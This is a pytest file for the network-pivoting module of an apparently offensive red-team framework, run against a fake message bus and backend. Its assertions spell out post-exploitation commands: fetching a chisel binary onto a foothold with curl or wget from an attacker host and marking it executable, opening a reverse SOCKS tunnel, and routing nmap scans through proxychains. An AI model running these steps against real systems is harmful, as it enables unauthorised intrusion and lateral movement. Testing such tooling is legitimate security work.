"""Network pivoting (issue #4): command builders, the foothold command runner's
sentinel protocol, and the pivot manager's proxy-env wiring. All pure or driven
by a fake bus/backend, so no container or foothold is needed."""

import asyncio
import re
from types import SimpleNamespace

import pytest
from redcell_core.bus import shell_channel, shell_input_channel
from redcell_core.engine import nmap, pivot

# ---- command builders ----------------------------------------------------------

def test_server_command_runs_chisel_reverse():
    cmd = pivot.server_command(8000)
    assert "chisel server -p 8000 --reverse" in cmd
    assert cmd.strip().endswith("echo started")


def test_client_command_requests_reverse_socks():
    cmd = pivot.client_command("10.0.0.1", 8000, 1080)
    assert "client 10.0.0.1:8000 R:127.0.0.1:1080:socks" in cmd


def test_fetch_command_tries_curl_then_wget():
    cmd = pivot.fetch_command("10.0.0.1", 8001)
    assert "curl -fsS http://10.0.0.1:8001/chisel" in cmd
    assert "wget -q http://10.0.0.1:8001/chisel" in cmd
    assert "chmod +x" in cmd


def test_socks_wait_command_probes_the_port():
    assert "nc -z 127.0.0.1 1080" in pivot.socks_wait_command(1080)


def test_proxychains_wrap_only_wraps_when_active():
    assert pivot.proxychains_wrap("nmap -sT x", False) == "nmap -sT x"
    wrapped = pivot.proxychains_wrap("nmap -sT x", True)
    assert wrapped.startswith("proxychains4 -f ")
    assert wrapped.endswith("nmap -sT x")


def test_nmap_connect_scan_flag():
    assert "-sT" in nmap.build_nmap_command("10.0.0.5", connect_scan=True)
    assert "-sT" not in nmap.build_nmap_command("10.0.0.5", connect_scan=False)


# ---- fake bus ------------------------------------------------------------------

class FakeBus:
    """Minimal pub/sub over asyncio queues, matching the Bus interface the
    FootholdRunner uses (subscribe yields strings, publish fans out)."""

    def __init__(self) -> None:
        self.subs: dict[str, list[asyncio.Queue]] = {}
        self.published: list[tuple[str, str]] = []

    async def subscribe(self, channel: str):
        q: asyncio.Queue = asyncio.Queue()
        self.subs.setdefault(channel, []).append(q)
        while True:
            item = await q.get()
            yield item

    async def _emit(self, channel: str, data: str) -> None:
        for q in self.subs.get(channel, []):
            await q.put(data)

    async def publish(self, channel: str, data: str) -> None:
        self.published.append((channel, data))
        await self._emit(channel, data)


class AutoFootholdBus(FakeBus):
    """A FakeBus that plays the foothold: when a command is sent to a shell, it
    echoes canned output followed by the sentinel the runner is waiting for."""

    def __init__(self, *, fetch_ok: bool = True) -> None:
        super().__init__()
        self.fetch_ok = fetch_ok

    async def publish(self, channel: str, data: str) -> None:
        await super().publish(channel, data)
        if channel.startswith("shellin:"):
            m = re.search(r"echo (RC[0-9a-f]+):\$\?", data)
            if m:
                shell_id = channel.split(":", 1)[1]
                asyncio.create_task(self._respond(shell_id, self._canned(data), m.group(1)))

    def _canned(self, data: str) -> str:
        if "curl" in data or "wget" in data:
            return "fetched" if self.fetch_ok else "curl: not found"
        if "chisel" in data and "client" in data:
            return "started"
        if "pkill" in data:
            return "done"
        return ""

    async def _respond(self, shell_id: str, out: str, marker: str) -> None:
        await asyncio.sleep(0.02)
        await self._emit(shell_channel(shell_id), f"{out}\n{marker}:0\n")


class FakeBackend:
    kind = "remote-docker"

    def __init__(self) -> None:
        self.proxy_env: dict[str, str] = {}
        self.commands: list[str] = []

    async def run(self, command: str, on_output=None):
        self.commands.append(command)
        out = ""
        if "nc -z" in command:
            out = "PIVOT_UP"
        elif "echo started" in command:
            out = "started"
        elif "echo wrote" in command:
            out = "wrote"
        return SimpleNamespace(output=out, exit_code=0)


# ---- foothold runner -----------------------------------------------------------

@pytest.mark.asyncio
async def test_foothold_runner_captures_output_and_exit_code():
    bus = FakeBus()
    runner = pivot.FootholdRunner(bus, "sh-1", settle=0.01)
    task = asyncio.create_task(runner.run("id", timeout=2))
    # Wait until the command (with sentinel) is on the wire, then read its marker.
    for _ in range(200):
        sent = [d for ch, d in bus.published if ch == shell_input_channel("sh-1")]
        if sent:
            break
        await asyncio.sleep(0.01)
    marker = re.search(r"echo (RC[0-9a-f]+):\$\?", sent[0]).group(1)
    await bus.publish(shell_channel("sh-1"), "uid=0(root) gid=0(root)\n")
    await bus.publish(shell_channel("sh-1"), f"{marker}:0\n")
    result = await task
    assert result.exit_code == 0
    assert "uid=0(root)" in result.output
    assert marker not in result.output  # sentinel is stripped from the captured output


@pytest.mark.asyncio
async def test_foothold_runner_times_out_without_a_sentinel():
    bus = FakeBus()
    runner = pivot.FootholdRunner(bus, "sh-1", settle=0.01)
    result = await runner.run("sleep 999", timeout=0.2)
    assert result.timed_out
    assert result.exit_code is None


# ---- pivot manager -------------------------------------------------------------

@pytest.mark.asyncio
async def test_pivot_open_sets_proxy_env_and_close_restores():
    bus = AutoFootholdBus()
    backend = FakeBackend()
    pm = pivot.PivotManager(backend, bus, "10.0.0.1", socks_port=1080)
    res = await pm.open("sh-1")
    assert res["ok"] is True
    assert pm.active
    assert backend.proxy_env.get("all_proxy") == "socks5://127.0.0.1:1080"
    assert backend.proxy_env.get("ALL_PROXY") == "socks5://127.0.0.1:1080"
    await pm.close()
    assert not pm.active
    assert backend.proxy_env == {}  # restored to the pre-pivot state


@pytest.mark.asyncio
async def test_pivot_open_fails_when_foothold_cannot_fetch_chisel():
    bus = AutoFootholdBus(fetch_ok=False)
    backend = FakeBackend()
    pm = pivot.PivotManager(backend, bus, "10.0.0.1")
    res = await pm.open("sh-1")
    assert res["ok"] is False
    assert not pm.active
    assert backend.proxy_env == {}  # never touched on failure
